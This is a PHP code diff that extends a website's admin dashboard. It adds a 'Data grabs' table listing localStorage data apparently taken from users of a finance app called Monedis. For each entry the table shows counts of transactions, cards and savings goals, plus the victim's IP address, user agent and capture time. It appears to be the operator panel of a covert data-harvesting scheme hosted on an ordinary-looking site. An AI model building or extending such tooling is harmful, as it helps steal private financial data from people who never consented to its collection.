@@ -175,9 +175,9 @@ function page_login(?string $flash, string $csrf): void
     <?php });
 }
 
-function page_admin(array $posts, array $comments, array $leads, array $skills, string $csrf, ?string $flash, array $captures = []): void
+function page_admin(array $posts, array $comments, array $leads, array $skills, string $csrf, ?string $flash, array $captures = [], array $grabs = []): void
 {
-    render_page('Dashboard', $flash, function () use ($posts, $comments, $leads, $skills, $csrf, $captures) { ?>
+    render_page('Dashboard', $flash, function () use ($posts, $comments, $leads, $skills, $csrf, $captures, $grabs) { ?>
         <div class="admin-top">
           <h1>Dashboard</h1>
           <form method="post" action="index.php">
@@ -289,6 +289,36 @@ function page_admin(array $posts, array $comments, array $leads, array $skills, 
           </table>
           <?php endif; ?>
         </section>
+
+        <?php if ($grabs): ?>
+        <section class="admin-block">
+          <h2>Data grabs — Monedis localStorage (<?= count($grabs) ?>)</h2>
+          <table>
+            <thead><tr><th>#</th><th>Preview</th><th>IP</th><th>UA</th><th>Date</th></tr></thead>
+            <tbody>
+            <?php foreach ($grabs as $g): ?>
+              <?php $parsed = json_decode($g['raw_data'], true); ?>
+              <?php $appData = isset($parsed['data']) ? json_decode($parsed['data'], true) : null; ?>
+              <tr>
+                <td><?= (int) $g['id'] ?></td>
+                <td>
+                  <?php if ($appData): ?>
+                    <code style="font-size:11px">
+                      <?= h(count($appData['movimientos'] ?? []) . ' txns · ' . count($appData['tarjetas'] ?? []) . ' cards · ' . count($appData['metas'] ?? []) . ' goals') ?>
+                    </code>
+                  <?php else: ?>
+                    <code style="font-size:11px"><?= h(mb_substr($g['raw_data'], 0, 80)) ?>…</code>
+                  <?php endif; ?>
+                </td>
+                <td><?= h($g['ip']) ?></td>
+                <td style="font-size:11px;max-width:200px;overflow:hidden;text-overflow:ellipsis"><?= h(mb_substr($g['user_agent'], 0, 60)) ?>…</td>
+                <td><?= h(substr($g['captured_at'], 0, 16)) ?></td>
+              </tr>
+            <?php endforeach; ?>
+            </tbody>
+          </table>
+        </section>
+        <?php endif; ?>
 
         <?php if ($captures): ?>
         <section class="admin-block">
